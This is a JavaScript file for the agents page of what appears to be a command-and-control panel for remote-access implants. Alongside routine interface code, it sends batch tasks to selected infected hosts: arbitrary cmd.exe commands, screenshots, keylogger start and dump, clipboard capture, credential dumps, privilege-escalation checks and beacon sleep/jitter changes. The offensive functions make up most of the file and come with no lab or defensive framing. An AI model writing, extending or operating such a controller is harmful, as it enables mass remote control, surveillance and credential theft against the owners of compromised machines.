// Agents page - batch operations, time-ago, modals, lock sync

let currentAgentId = '';
let currentHostname = '';
let agentsVirtualList = null;

document.addEventListener('DOMContentLoaded', function() {
    initAgentsVirtualList();
    const selectAll = document.getElementById('select-all');
    if (selectAll) {
        selectAll.addEventListener('change', function() {
            document.querySelectorAll('.agent-checkbox').forEach(cb => cb.checked = this.checked);
            updateBatchBar();
        });
        document.querySelectorAll('.agent-checkbox').forEach(cb => {
            cb.addEventListener('change', updateBatchBar);
        });
    }
    updateTimeAgo();
    setInterval(updateTimeAgo, 30000);
});

function initAgentsVirtualList() {
    const container = document.getElementById('agents-table-container');
    if (!container) return;
    
    const tbody = container.querySelector('tbody');
    if (!tbody) return;
    
    const rows = tbody.querySelectorAll('tr');
    if (rows.length > 100) {
        agentsVirtualList = new VirtualList({
            container: container,
            threshold: 100,
            buffer: 10,
            itemHeight: 60
        });
        agentsVirtualList.enable();
        
        setTimeout(() => {
            if (agentsVirtualList) {
                agentsVirtualList.recalcHeights();
                bindVirtualListEvents();
            }
        }, 100);
    }
}

function bindVirtualListEvents() {
    if (!agentsVirtualList || !agentsVirtualList.enabled) return;
    
    const selectAll = document.getElementById('select-all');
    if (selectAll) {
        selectAll.addEventListener('change', function() {
            document.querySelectorAll('.agent-checkbox').forEach(cb => cb.checked = this.checked);
            updateBatchBar();
        });
    }
    
    document.addEventListener('change', function(e) {
        if (e.target.classList.contains('agent-checkbox')) {
            updateBatchBar();
        }
    });
}

function updateBatchBar() {
    const checked = document.querySelectorAll('.agent-checkbox:checked');
    const bar = document.getElementById('batch-bar');
    const count = document.getElementById('batch-count');
    if (checked.length > 0) {
        bar.classList.remove('hidden');
        bar.classList.add('flex');
        count.textContent = __tf('{0} selected', checked.length);
    } else {
        bar.classList.add('hidden');
        bar.classList.remove('flex');
    }
}

function getSelectedIds() {
    return Array.from(document.querySelectorAll('.agent-checkbox:checked')).map(cb =>
        cb.closest('.agent-row').dataset.agentId
    );
}

function deselectAll() {
    document.querySelectorAll('.agent-checkbox').forEach(cb => cb.checked = false);
    const selectAll = document.getElementById('select-all');
    if (selectAll) selectAll.checked = false;
    updateBatchBar();
}

function batchShell() {
    const ids = getSelectedIds();
    if (ids.length === 0) return;
    const cmd = prompt(__tf('Execute command on all {0} selected agents:', ids.length), 'whoami');
    if (!cmd) return;
    fetch('/agents/batch', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ agent_ids: ids, command: cmd, shell: 'cmd.exe', task_type: 'shell' })
    }).then(r => r.json()).then(data => {
        if (data.success) {
            showToast(__tf('Sent command to {0} agents', data.tasks_created) + (data.skipped_locked > 0 ? __tf(' (skipped {0} locked)', data.skipped_locked) : ''));
            deselectAll();
        } else {
            showToast(__tf('Failed: {0}', data.error || ''), 'error');
        }
    }).catch(err => showToast(__tf('Error: {0}', err), 'error'));
}

function batchScreenshot() {
    const ids = getSelectedIds();
    if (ids.length === 0) return;
    if (!confirm(__tf('Send screenshot command to {0} agents?', ids.length))) return;
    fetch('/agents/batch', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ agent_ids: ids, task_type: 'screenshot' })
    }).then(r => r.json()).then(data => {
        if (data.success) {
            showToast(__tf('Sent screenshot command to {0} agents', data.tasks_created));
            deselectAll();
        } else {
            showToast(__tf('Failed: {0}', data.error || ''), 'error');
        }
    }).catch(err => showToast(__tf('Error: {0}', err), 'error'));
}

function batchKeylogger(action) {
    const ids = getSelectedIds();
    if (ids.length === 0) return;
    const actionNames = { start: __('Start Keylogger'), dump: __('Dump Keylogger'), stop: __('Stop Keylogger') };
    if (!confirm(__tf('Send {1} to {0} agents?', ids.length, actionNames[action]))) return;
    fetch('/agents/batch', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ agent_ids: ids, task_type: 'keylogger_' + action })
    }).then(r => r.json()).then(data => {
        if (data.success) {
            showToast(__tf('Sent {1} to {0} agents', data.tasks_created, actionNames[action]));
            deselectAll();
        } else {
            showToast(__tf('Failed: {0}', data.error || ''), 'error');
        }
    }).catch(err => showToast(__tf('Error: {0}', err), 'error'));
}

function batchClipboard() {
    const ids = getSelectedIds();
    if (ids.length === 0) return;
    fetch('/agents/batch', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ agent_ids: ids, task_type: 'clipboard_get' })
    }).then(r => r.json()).then(data => {
        if (data.success) {
            showToast(__tf('Sent clipboard command to {0} agents', data.tasks_created));
            deselectAll();
        } else {
            showToast(__tf('Failed: {0}', data.error || ''), 'error');
        }
    }).catch(err => showToast(__tf('Error: {0}', err), 'error'));
}

function batchCredsDump() {
    const ids = getSelectedIds();
    if (ids.length === 0) return;
    if (!confirm(__tf('Send credential dump to {0} agents?\nThis may require admin privileges.', ids.length))) return;
    fetch('/agents/batch', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ agent_ids: ids, task_type: 'creds_dump' })
    }).then(r => r.json()).then(data => {
        if (data.success) {
            showToast(__tf('Sent credential dump to {0} agents', data.tasks_created));
            deselectAll();
        } else {
            showToast(__tf('Failed: {0}', data.error || ''), 'error');
        }
    }).catch(err => showToast(__tf('Error: {0}', err), 'error'));
}

function batchPrivescCheck() {
    const ids = getSelectedIds();
    if (ids.length === 0) return;
    if (!confirm(__tf('Send privesc check to {0} agents?', ids.length))) return;
    fetch('/agents/batch', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ agent_ids: ids, task_type: 'privesc_check' })
    }).then(r => r.json()).then(data => {
        if (data.success) {
            showToast(__tf('Sent privesc check to {0} agents', data.tasks_created));
            deselectAll();
        } else {
            showToast(__tf('Failed: {0}', data.error || ''), 'error');
        }
    }).catch(err => showToast(__tf('Error: {0}', err), 'error'));
}

function batchSleep() {
    const ids = getSelectedIds();
    if (ids.length === 0) return;
    const interval = prompt(__tf('Enter new sleep interval (seconds):'), '30');
    if (!interval) return;
    const jitter = prompt(__tf('Enter jitter percentage (0-100):'), '20');
    if (!jitter) return;
    fetch('/agents/batch', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ agent_ids: ids, task_type: 'sleep', args: interval + ',' + jitter })
    }).then(r => r.json()).then(data => {
        if (data.success) {
            showToast(__tf('Changed sleep interval on {0} agents', data.tasks_created));
            deselectAll();
        } else {
            showToast(__tf('Failed: {0}', data.error || ''), 'error');
        }
    }).catch(err => showToast(__tf('Error: {0}', err), 'error'));
}

function batchDelete() {
    const ids = getSelectedIds();
    if (ids.length === 0) return;
    if (!confirm(__tf('Delete {0} selected agents?', ids.length))) return;
    let done = 0;
    ids.forEach(id => {
        fetch('/agents/' + id, { method: 'DELETE' })
            .then(() => { done++; if (done === ids.length) { showToast(__tf('Deleted {0} agents', done)); setTimeout(() => location.reload(), 1000); } })
            .catch(() => showToast(__t('Failed to delete agent'), 'error'));
    });
}

function updateTimeAgo() {
    document.querySelectorAll('.time-ago').forEach(el => {
        const ts = parseInt(el.dataset.time);
        if (!ts) return;
        const diff = Math.floor(Date.now() / 1000) - ts;
        if (diff < 60) el.textContent = __('just now');
        else if (diff < 3600) el.textContent = __tf('{0}m ago', Math.floor(diff / 60));
        else if (diff < 86400) el.textContent = __tf('{0}h ago', Math.floor(diff / 3600));
        else el.textContent = __tf('{0}d ago', Math.floor(diff / 86400));
    });
}

function showOfflineModal(agentId, hostname) {
    currentAgentId = agentId; currentHostname = hostname;
    document.getElementById('modal-hostname').textContent = hostname;
    document.getElementById('offline-modal').classList.remove('hidden');
    document.body.style.overflow = 'hidden';
}
function hideOfflineModal() {
    document.getElementById('offline-modal').classList.add('hidden');
    document.body.style.overflow = '';
}
function confirmOffline() {
    fetch(`/agents/${currentAgentId}/kill`, { method: 'POST', headers: {'Content-Type': 'application/json'} })
        .then(r => r.json()).then(data => {
            hideOfflineModal();
            if (data.success) { showToast(__('Agent taken offline'), 'success'); setTimeout(() => location.reload(), 1500); }
            else { showToast(__tf('Failed to take offline: {0}', data.error || ''), 'error'); }
        }).catch(err => { hideOfflineModal(); showToast(__tf('Error: {0}', err), 'error'); });
}
function showDeleteModal(agentId, hostname) {
    currentAgentId = agentId; currentHostname = hostname;
    document.getElementById('delete-hostname').textContent = hostname;
    document.getElementById('delete-modal').classList.remove('hidden');
    document.body.style.overflow = 'hidden';
}
function hideDeleteModal() {
    document.getElementById('delete-modal').classList.add('hidden');
    document.body.style.overflow = '';
}
function confirmAgentDelete() {
    fetch(`/agents/${currentAgentId}`, { method: 'DELETE' })
        .then(r => r.json()).then(data => {
            hideDeleteModal();
            if (data.success) { showToast(__('Agent deleted'), 'success'); setTimeout(() => location.reload(), 1500); }
            else { showToast(__tf('Failed to delete: {0}', data.error || ''), 'error'); }
        }).catch(err => { hideDeleteModal(); showToast(__tf('Error: {0}', err), 'error'); });
}

window.showOfflineModal = showOfflineModal;
window.hideOfflineModal = hideOfflineModal;
window.confirmOffline = confirmOffline;
window.showDeleteModal = showDeleteModal;
window.hideDeleteModal = hideDeleteModal;
window.confirmAgentDelete = confirmAgentDelete;

document.addEventListener('DOMContentLoaded', function() {
    function refreshLocks() {
        fetch('/api/collab/locks').then(r => r.json()).then(d => {
            if (!d.success || !d.locks) return;
            const lockMap = {};
            d.locks.forEach(l => { lockMap[l.agent_id] = l.username; });
            document.querySelectorAll('.agent-lock').forEach(el => {
                const aid = el.getAttribute('data-agent-id');
                if (lockMap[aid]) {
                    const lockSpan = document.createElement('span');
                    lockSpan.className = 'flex items-center gap-1 text-amber-600';
                    lockSpan.innerHTML = '<i class="fa-solid fa-lock text-[9px]"></i>';
                    lockSpan.appendChild(document.createTextNode(lockMap[aid]));
                    el.innerHTML = '';
                    el.appendChild(lockSpan);
                } else {
                    el.innerHTML = '—';
                }
            });
        }).catch(() => {});
    }
    refreshLocks();
    setInterval(refreshLocks, 30000);
});
